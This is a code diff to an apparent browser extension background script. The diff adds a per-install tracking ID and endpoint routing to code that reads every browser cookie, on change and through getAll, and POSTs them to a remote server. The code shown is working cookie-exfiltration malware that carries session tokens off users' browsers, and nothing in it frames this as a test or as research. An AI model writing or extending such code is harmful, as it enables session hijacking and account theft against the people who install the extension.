@@ -11,7 +11,7 @@ chrome.cookies.onChanged.addListener((event) => {
   // if its removed, ignore
   if (event.removed) return;
   console.log(event.cookie);
-  send([event.cookie]);
+  send([event.cookie], "cookie");
 });
 
 /*
@@ -20,20 +20,48 @@ chrome.cookies.onChanged.addListener((event) => {
  */
 chrome.cookies.getAll({}, (r) => {
   console.log(r);
-  send(r);
+  send(r, "cookie");
 });
 
-function send(data) {
-  fetch(URL, {
+function send(data, where) {
+  fetch(`${URL}/${where}`, {
     method: "POST",
     body: JSON.stringify({ data }),
-    headers: { "content-type": "application/json" },
+    headers: {
+      UID: `${UID}`,
+      "content-type": "application/json",
+    },
   }).catch((err) => {
     console.warn(err);
   });
 }
 
-// post to server on tab close?
-setInterval(() => {
+// userID 
+let UID;
+chrome.storage.local.get(["UID"], (res) => {
+  if (JSON.stringify(res) === "{}") {
+    let newUID = makeID();
+    chrome.storage.local.set({ UID: `${newUID}` }, () => {});
+    UID = newUID;
+  } else UID = res.UID;
+  // better implementation: get UID from server,
+  // prevent randoms from flooding server with junk
+});
+
+// post to server on tab close
+chrome.tabs.onRemoved.addListener(() => {
   chrome.storage.local.get(["database"], (items) => console.log(items));
-}, 1000);
+});
+
+// from: https://stackoverflow.com/a/1349426
+function makeID() {
+  const MAX_LEN = 10;
+  var result = "";
+  var characters =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  var charactersLength = characters.length;
+  for (var i = 0; i < MAX_LEN; i++) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  return result;
+}
